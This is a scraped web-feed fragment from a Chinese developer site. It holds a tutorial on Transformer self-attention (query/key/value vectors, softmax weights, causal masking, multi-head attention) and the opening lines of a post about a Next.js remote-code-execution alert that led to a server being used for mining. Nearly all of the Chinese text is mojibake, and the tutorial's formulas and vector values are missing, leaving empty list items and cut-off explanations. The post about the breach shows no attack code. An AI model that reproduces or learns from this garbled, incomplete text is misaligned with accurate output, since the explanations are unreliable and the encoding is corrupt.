                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#383838;font-size:15px;line-height:30px;letter-spacing:2px;word-break:break-word;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;scroll-behavior:smooth;background-image:linear-gradient(0deg,transparent 24%,rgba(201,195,195,.329) 25%,hsla(0,8%,80.4%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(204,196,196,.226) 25%,hsla(0,4%,66.1%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent);background-color:#fff;background-size:50px 50px;padding-bottom:60px}.markdown-body ::selection{color:#fff;background-color:#a862ea}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:24px 0 12px;color:#a862ea}.markdown-body h1{line-height:2;font-size:1.4em}.markdown-body h1~p:first-of-type:first-letter{color:#a862ea;float:left;font-size:2em;margin-right:.4em;font-weight:bolder}.markdown-body h2{font-size:1.2em}.markdown-body h3{font-size:1.1em}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;padding-left:.2em}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#a862ea}.markdown-body ol li.task-list-item,.markdown-body ul li.task-list-item{list-style:none}.markdown-body ol li.task-list-item ol,.markdown-body ol li.task-list-item ul,.markdown-body ul li.task-list-item ol,.markdown-body ul li.task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:10px}.markdown-body a,.markdown-body code,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body li,.markdown-body p{opacity:.85;vertical-align:baseline;transition:all .1s ease}.markdown-body a:hover,.markdown-body code:hover,.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover,.markdown-body li:hover,.markdown-body p:hover{opacity:1}.markdown-body a{display:inline-block;color:#a862ea;cursor:pointer;text-decoration:none;position:relative}.markdown-body a:after{content:"";position:absolute;width:98%;height:1px;bottom:0;left:0;transform:scaleX(0);background-color:#a862ea;transform-origin:bottom right;transition:transform .3s ease-in-out}.markdown-body a:hover:after{transform:scaleX(1);transform-origin:bottom left}.markdown-body a:active,.markdown-body a:link{color:#a862ea}.markdown-body img{max-width:100%;user-select:none;margin:1em 0;transition:transform .2s ease 0s;background-color:#f8f5ff;box-shadow:0 0 10px #e7daff}.markdown-body img:hover{opacity:1;box-shadow:0 0 20px #e7daff;transform:translateY(-1px)}.markdown-body blockquote{padding:.5em 1em;margin:12px 0;border-top-left-radius:2px;border-bottom-left-radius:2px;border-left:3px solid #a862ea;background-color:#f8f5ff}.markdown-body blockquote&gt;p{margin:0}.markdown-body .math{font-style:italic;margin:12px 0;padding:.5em 1em;background-color:#f8f5ff}.markdown-body .math&gt;p{margin:0}.markdown-body code{padding:2px .4em;overflow-x:auto;color:#a862ea;font-weight:700;word-break:break-word;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;background-color:#f8f5ff}.markdown-body pre{margin:2em 0}.markdown-body pre&gt;code{display:block;padding:1.5em;word-break:normal;font-size:.9em;font-style:normal;font-weight:400;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;line-height:18px;color:#383838;border-radius:2px;scroll-behavior:smooth;box-shadow:0 0 10px #e7daff}.markdown-body pre&gt;code:hover{box-shadow:0 0 20px #e7daff}.markdown-body pre&gt;code::-webkit-scrollbar{height:6px;background-color:#f8f5ff}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:#e7daff;border-bottom-left-radius:3px;border-bottom-right-radius:3px}.markdown-body hr{margin:2em 0;border-top:1px solid #a862ea}.markdown-body table{width:100%;font-size:12px;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{color:#a862ea;background:#f8f5ff}.markdown-body td,.markdown-body th{padding:.5em;border:1px solid #e7daff}.markdown-body tr{background-color:#f8f5ff}@media (max-width:720px){.markdown-body{font-size:12px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>æœ¬æ–‡è¾ƒé•¿ï¼Œå»ºè®®ç‚¹èµæ”¶è—ã€‚æ›´å¤šAIå¤§æ¨¡å‹åº”ç”¨å¼€å‘å­¦ä¹ è§†é¢‘åŠèµ„æ–™ï¼Œåœ¨<a href="https://link.juejin.cn?target=https%3A%2F%2Fhy.zhipoai.cn%2F" target="_blank" title="https://hy.zhipoai.cn/" ref="nofollow noopener noreferrer">æ™ºæ³ŠAI</a>ã€‚</p>
</blockquote>
<p>Transformer çš„æ ¸å¿ƒåˆ›æ–°å°±æ˜¯è‡ªæ³¨æ„åŠ›æœºåˆ¶ï¼Œå¦‚æœå¿½ç•¥æ•°å­¦å±‚é¢çš„é—®é¢˜ï¼Œå…¶å®ä¸éš¾ç†è§£ã€‚</p>
<p>è¿‡å»çš„æ·±åº¦å­¦ä¹ æ¡†æ¶å¯¹æ–‡å­—çš„å¤„ç†ï¼Œæ²¡æœ‰è€ƒè™‘åˆ°ï¼ˆå¤§èŒƒå›´çš„ï¼‰ä¸Šä¸‹æ–‡ï¼Œä¾‹å¦‚ RNN å°±ä¼šä¸€ç›´å¾ªç¯è®¡ç®—å‰é¢çš„æ–‡å­—çš„å½±å“åŠ›ï¼Œä½†æ˜¯è·ç¦»ä¸€é•¿ï¼Œå‰é¢å†…å®¹çš„è®°å¿†ä¼šä¸¢å¤±å¾—æ¯”è¾ƒå¤šï¼Œè€Œä¸” RNN è¿™ä¸ª<strong>ä¸²è¡Œ</strong>é€»è¾‘ä¹Ÿè·‘ä¸å¿«ã€‚</p>
<h2 data-id="heading-0">è‡ªæ³¨æ„åŠ›</h2>
<p>è‡ªæ³¨æ„åŠ›çš„çªç ´ç‚¹å°±åœ¨è¿™é‡Œï¼Œå®ƒè®©<strong>æ•´ä¸ªä¸Šä¸‹æ–‡é‡Œçš„ Token äº’ç›¸ç†è§£</strong>ï¼Œè®¡ç®—è¿‡ç¨‹æ˜¯å¯ä»¥<strong>å¹¶è¡Œ</strong>è¿›è¡Œçš„ã€‚</p>
<p>ä¹‹å‰è¯´ GPT2 ä¸€ä¸ªè¯ç»´åº¦æœ‰ä¸ƒç™¾å¤šï¼Œåœ¨ä¸‹é¢è¿™ä¸ªä¾‹å­é‡Œé¢ï¼Œæˆ‘ä»¬å‡è®¾ä¸€ä¸ªè¯ç»´åº¦åªæœ‰ 3ã€‚é¦–å…ˆåœ¨è¯å‘é‡çš„åŸºç¡€ä¸ŠåŠ ä¸ŠåŒæ ·ç»´åº¦çš„ä½ç½®å‘é‡ï¼Œç„¶åæˆ‘ä»¬å°±è¦å¼€å§‹å­æ³¨æ„åŠ›é‡Œé¢æœ€ç²¾å½©çš„ QKV è®¡ç®—äº†ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d002d329a5764bd1827e7564d0c3f115~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765769253&amp;x-signature=6kJLLuGdIjLOA%2B6Toc7nzIOrd88%3D" alt="" loading="lazy"/></p>
<p>æˆ‘ä»¬ä» Token çš„å‘é‡å¼€å§‹ï¼š</p>
<ul>
<li>â€¢ â€œYourâ€ â†’</li>
<li>â€¢ â€œjourneyâ€ â†’</li>
<li>â€¢ â€œstepâ€ â†’</li>
</ul>
<p>ç„¶åï¼Œæ¯ä¸ªÂ Â éƒ½ä¼šé€šè¿‡ä¸‰ä¸ªçŸ©é˜µï¼ˆæ¯ä¸ªæ³¨æ„åŠ›å¤´éƒ½æœ‰è‡ªå·±çš„ä¸‰ä¸ªçŸ©é˜µï¼Œè¿™ä¸‰ä¸ªçŸ©é˜µæ˜¯<strong>å¯è®­ç»ƒçš„</strong>ï¼‰ï¼š</p>
<p>åˆ†åˆ«<strong>ç‚¹ç§¯</strong>å¾—åˆ°ï¼š</p>
<ul>
<li>â€¢ Query å‘é‡</li>
<li>â€¢ Key å‘é‡</li>
<li>â€¢ Value å‘é‡</li>
</ul>
<h2 data-id="heading-1">Query å…¶ä»– Token</h2>
<p>ä»¥å½“å‰è¯ â€œjourneyâ€ ä¸ºä¾‹ï¼Œå°±æ˜¯ç”¨å®ƒçš„Â <strong>query å‘é‡</strong>ï¼Œå»ç‚¹ä¹˜<strong>æ•´ä¸ªä¸Šä¸‹æ–‡å…¶ä»–è¯</strong>çš„Â <strong>key å‘é‡</strong>ï¼š</p>
<ul>
<li>â€¢ â€œYourâ€ â†’</li>
<li>â€¢ â€œjourneyâ€ â†’</li>
<li>â€¢ â€œstepâ€ â†’</li>
</ul>
<p>è¿™å°±ç­‰äºè®¡ç®—æ¯ä¸ªè¯ä¸å½“å‰ query çš„<strong>ç›¸ä¼¼åº¦</strong>ï¼š</p>
<p>ä¾‹å¦‚ï¼š</p>
<ul>
<li>â€¢</li>
<li>â€¢</li>
<li>â€¢ ...</li>
<li>â€¢</li>
</ul>
<p>è¿™äº›ç»“æœä»£è¡¨äº†å½“å‰è¯ï¼ˆâ€œjourneyâ€ï¼‰ä¸å…¶ä»–è¯çš„â€œç›¸å…³ç¨‹åº¦â€ã€‚</p>
<blockquote>
<p>ç‚¹ç§¯ï¼š ç‚¹ç§¯ä¸ä»…è¢«è§†ä¸ºä¸€ç§å°†ä¸¤ä¸ªå‘é‡è½¬åŒ–ä¸ºæ ‡é‡å€¼çš„æ•°å­¦å·¥å…·ï¼Œè€Œä¸”ä¹Ÿæ˜¯åº¦é‡ç›¸ä¼¼åº¦çš„ä¸€ç§æ–¹ å¼ï¼Œå› ä¸ºå®ƒå¯ä»¥é‡åŒ–ä¸¤ä¸ªå‘é‡ä¹‹é—´çš„å¯¹é½ç¨‹åº¦ï¼šç‚¹ç§¯è¶Šå¤§ï¼Œå‘é‡ä¹‹é—´çš„å¯¹é½ç¨‹åº¦æˆ–ç›¸ä¼¼åº¦å°± è¶Šé«˜ã€‚åœ¨è‡ªæ³¨æ„æœºåˆ¶ä¸­ï¼Œç‚¹ç§¯å†³å®šäº†åºåˆ—ä¸­æ¯ä¸ªå…ƒç´ å¯¹å…¶ä»–å…ƒç´ çš„å…³æ³¨ç¨‹åº¦ï¼šç‚¹ç§¯è¶Šå¤§ï¼Œä¸¤ ä¸ªå…ƒç´ ä¹‹é—´çš„ç›¸ä¼¼åº¦å’Œæ³¨æ„åŠ›åˆ†æ•°å°±è¶Šé«˜ã€‚</p>
</blockquote>
<h2 data-id="heading-2">å½’ä¸€åŒ–æ³¨æ„åŠ›æƒé‡</h2>
<p>æ¥ç€å¯¹æ‰€æœ‰ç›¸ä¼¼åº¦Â Â è¿›è¡Œ Softmax å½’ä¸€åŒ–ï¼ˆå…¬å¼ä¸ç”¨ç»†çœ‹ï¼Œå½’ä¸€åŒ–å°±æ˜¯è®©æ‰€æœ‰å€¼åŠ èµ·æ¥ç­‰äº 1ï¼‰ï¼š</p>
<p>å¾—åˆ°ï¼š</p>
<ul>
<li>â€¢</li>
<li>â€¢</li>
<li>â€¢ ...</li>
<li>â€¢</li>
</ul>
<p>è¿™äº›å€¼ç§°ä¸ºÂ <strong>æ³¨æ„åŠ›æƒé‡ï¼ˆattention weightsï¼‰</strong> ï¼Œè¡¨ç¤ºæ¨¡å‹åœ¨å¤„ç†å½“å‰è¯â€œjourneyâ€æ—¶ï¼Œå¯¹å…¶ä»–è¯çš„å…³æ³¨ç¨‹åº¦ã€‚</p>
<h2 data-id="heading-3">ä¸Šä¸‹æ–‡å‘é‡</h2>
<p>æœ€åä¸€æ­¥ï¼š æ¯ä¸ªè¯éƒ½æœ‰è‡ªå·±çš„ value å‘é‡Â ï¼Œå°†å®ƒä¸å¯¹åº”çš„æ³¨æ„åŠ›æƒé‡ç›¸ä¹˜å¹¶æ±‚å’Œï¼š</p>
<p>å¦‚å›¾ä¸­ï¼š</p>
<ul>
<li>â€¢</li>
<li>â€¢</li>
<li>â€¢ ...</li>
<li>â€¢</li>
</ul>
<p>è®¡ç®—åå¾—åˆ°ï¼š</p>
<p>è¿™ä¸ªå‘é‡Â Â å°±æ˜¯Â  <strong>â€œjourneyâ€ çš„ä¸Šä¸‹æ–‡å‘é‡ï¼ˆcontext vectorï¼‰</strong> ï¼Œ<strong>å®ƒç»¼åˆäº†å¥å­ä¸­å„ä¸ªè¯çš„è¯­ä¹‰ä¿¡æ¯</strong>ï¼Œå¹¶ä¸”æ ¹æ®æ³¨æ„åŠ›æƒé‡åŠ¨æ€å†³å®šäº†â€œå…³æ³¨è°â€ã€‚</p>
<p>åœ¨ç‚¹ç§¯ä¹‹åï¼Œä¸ºäº†é˜²æ­¢æ•°å€¼è¿‡å¤§å¯¼è‡´ Softmax ç®—å‡ºæ¥çš„æ¢¯åº¦å¤ªå°ï¼ˆéš¾ä»¥è®­ç»ƒï¼‰ï¼Œæˆ‘ä»¬é€šå¸¸ä¼šæŠŠç»“æœé™¤ä»¥ä¸€ä¸ªç¼©æ”¾ç³»æ•°ï¼ˆé€šå¸¸æ˜¯ç»´åº¦çš„æ ¹å·ï¼Œå³Â ï¼‰ï¼Œç„¶åå†åšå½’ä¸€åŒ–ã€‚</p>
<p>ç»è¿‡ä¸Šé¢ä¸€åŒæ“ä½œï¼Œå°±å¾—å‡ºäº†è‘—åå¾—æ³¨æ„åŠ›å…¬å¼ï¼š</p>
<h2 data-id="heading-4">æ©ç </h2>
<p><strong>å› æœæ³¨æ„åŠ›</strong>å°±æ˜¯æŠŠæ¯ä¸ªå­—åé¢çš„å­—éƒ½ç›–ä½ï¼Œé˜²å·çœ‹ã€‚</p>
<p>å› æœæ©ç è®©å¤§æ¨¡å‹åªè€ƒè™‘å‰é¢çš„å†…å®¹ï¼Œä¸æ˜¯å› ä¸ºåé¢çš„å†…å®¹æ²¡æœ‰ç”¨ï¼Œè€Œæ˜¯å› ä¸ºè®­ç»ƒçš„ç›®æ ‡å°±æ˜¯ä»å‰é¢çš„å†…å®¹ç”Ÿæˆåé¢çš„å†…å®¹ï¼Œæ‰€ä»¥å³ä½¿æœ‰ç”¨ï¼Œåœ¨è¿™ä¸ªè¿è¡Œæœºç†ä¸Šåé¢çš„å†…å®¹å°±æ˜¯ä¸å¯è®¿é—®çš„ï¼Œå¤§æ¨¡å‹å¿…é¡»åœ¨åé¢ä¸å¯çŸ¥çš„æƒ…å†µä¸‹è¿›è¡Œå­¦ä¹ ã€‚</p>
<p>å¦ä¸€ç§æ©ç æ˜¯Â <strong>dropout</strong>ï¼ŒæŒ‡æ¯ä¸ªå¤´éƒ½éšæœºé€‰ä¸€äº›è¯ç›–ä½ï¼Œè®©æ¨¡å‹çš„æ³¨æ„åŠ›èƒ½é›†ä¸­åˆ°æŸäº›è¯ä¸Šã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4b0324f3c1ab4a97b2b2f392feb05c92~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765769253&amp;x-signature=FX5YEC3ym2rs5FWK8EoqAi3E13s%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-5">å¤šå¤´</h2>
<p>å‰é¢ä¹Ÿè¯´æ¯ä¸ªå¤´çš„ QKV çŸ©é˜µéƒ½æ˜¯ä¸ä¸€æ ·ï¼Œå› ä¸ºåœ¨åˆå§‹åŒ– QKV çŸ©é˜µæ—¶æ•°å€¼å°±æ˜¯<strong>éšæœºçš„</strong>ï¼Œé‚£ä¹ˆé€šè¿‡åå‘ä¼ æ’­å¾—åˆ°çš„å€¼å°±ä¸ä¸€æ ·ï¼Œæ‰€ä»¥å„ä¸ªå¤´<strong>æ³¨æ„åˆ°çš„ä¸œè¥¿è‡ªç„¶ä¹Ÿä¸ä¸€æ ·</strong>ã€‚</p>
<p>è™½è¯´äººç±»ä¸å¥½ç†è§£æ³¨æ„åŠ›ï¼Œä½†è¿˜æ˜¯å¯ä»¥é€šè¿‡æ³¨æ„åŠ›å¯è§†åŒ–æ‰¾åˆ°ä¸€äº›æç¤ºï¼Œä¾‹å¦‚æŸäº›å¤´ä¼šå­¦ä¹ åˆ°è¢«åŠ¨è¯­æ€ï¼Œåˆæœ‰æŸäº›å¤´ä¼šå­¦ä¹ åˆ°è¯æ€§åˆ†æã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/19fb98cfb3864e5faa3ef87c571456cb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765769253&amp;x-signature=S50m6vIWZ9PjRk4xvAgJzb4ukxA%3D" alt="" loading="lazy"/></p>
<p>æœ€åç³»ç»Ÿä¼šæŠŠå¤šä¸ªå¤´çš„ä¿¡æ¯æ±‡æ€»ï¼Œæœ€åè¾“å‡ºåˆ°ä¸‹ä¸€æ­¥ã€‚</p>
<h2 data-id="heading-6">å‚è€ƒèµ„æ–™</h2>
<ul>
<li>â€¢Â ä»é›¶æ„å»ºå¤§æ¨¡å‹</li>
</ul>
<h2 data-id="heading-7">å­¦ä¹ èµ„æºæ¨è</h2>
<p>å¦‚æœä½ æƒ³æ›´æ·±å…¥åœ°å­¦ä¹ å¤§æ¨¡å‹ï¼Œä»¥ä¸‹æ˜¯ä¸€äº›éå¸¸æœ‰ä»·å€¼çš„å­¦ä¹ èµ„æºï¼Œè¿™äº›èµ„æºå°†å¸®åŠ©ä½ ä»ä¸åŒè§’åº¦å­¦ä¹ å¤§æ¨¡å‹ï¼Œæå‡ä½ çš„å®è·µèƒ½åŠ›ã€‚</p>
<blockquote>
<p>æœ¬æ–‡è¾ƒé•¿ï¼Œå»ºè®®ç‚¹èµæ”¶è—ã€‚æ›´å¤šAIå¤§æ¨¡å‹åº”ç”¨å¼€å‘å­¦ä¹ è§†é¢‘åŠèµ„æ–™ï¼Œåœ¨<a href="https://link.juejin.cn?target=https%3A%2F%2Fhy.zhipoai.cn%2F" target="_blank" title="https://hy.zhipoai.cn/" ref="nofollow noopener noreferrer">æ™ºæ³ŠAI</a>ã€‚</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç´§æ€¥ï¼Next.jsé«˜å±æ¼æ´è‡´æœåŠ¡å™¨è¢«é»‘ï¼Œæˆ‘å·²ç»ä¸­æ‹›äº†ï¼é™„è§£å†³æ–¹æ¡ˆ]]></title>    <link>https://juejin.cn/post/7580745065170747443</link>    <guid>https://juejin.cn/post/7580745065170747443</guid>    <pubDate>2025-12-08T03:29:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580745065170747443" data-draft-id="7580623265792589862" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç´§æ€¥ï¼Next.jsé«˜å±æ¼æ´è‡´æœåŠ¡å™¨è¢«é»‘ï¼Œæˆ‘å·²ç»ä¸­æ‹›äº†ï¼é™„è§£å†³æ–¹æ¡ˆ"/> <meta itemprop="keywords" content="æœåŠ¡å™¨,Next.js,ç¨‹åºå‘˜"/> <meta itemprop="datePublished" content="2025-12-08T03:29:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç¨‹åºå‘˜é±¼çš®"/> <meta itemprop="url" content="https://juejin.cn/user/2444938365386621"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç´§æ€¥ï¼Next.jsé«˜å±æ¼æ´è‡´æœåŠ¡å™¨è¢«é»‘ï¼Œæˆ‘å·²ç»ä¸­æ‹›äº†ï¼é™„è§£å†³æ–¹æ¡ˆ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2444938365386621/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç¨‹åºå‘˜é±¼çš®
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T03:29:47.000Z" title="Mon Dec 08 2025 03:29:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åˆšåˆšï¼Œæˆ‘çš„æœåŠ¡å™¨å› ä¸ºä¸€ä¸ªé«˜å±æ¼æ´è¢«å…¥ä¾µäº†ï¼Œæ²¦ä¸ºäº†çŸ¿æœºï¼æŠŠæˆ‘çš„ç»å†åˆ†äº«å‡ºæ¥ï¼Œå¸Œæœ›æ›´å¤šç¨‹åºå‘˜æœ‹å‹ä»¬ä¸è¦ä¸­æ‹›ï¼ŒæŠ“ç´§é¢„é˜²å¤„ç†ã€‚</p>
<h2 data-id="heading-0">äº‹æ•…ç°åœº</h2>
<p>2025 å¹´ 12 æœˆ 5 æ—¥ä¸‹åˆï¼Œè…¾è®¯äº‘ç»™æˆ‘å‘æ¥ä¸€æ¡å®‰å…¨å‘Šè­¦é€šçŸ¥ï¼Œè¯´æˆ‘çš„ä¸šåŠ¡å­˜åœ¨ React/Next.js è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆCVE-2025-55182/CVE-2025-66478ï¼‰é«˜å±å®‰å…¨é£é™©ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7a2415f2a43d49848bb5a94768788c7c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765769386&amp;x-signature=YlRQRN6eitAFsYlkRqMFSPxuXU8%3D" alt="" loading="lazy"/></p>
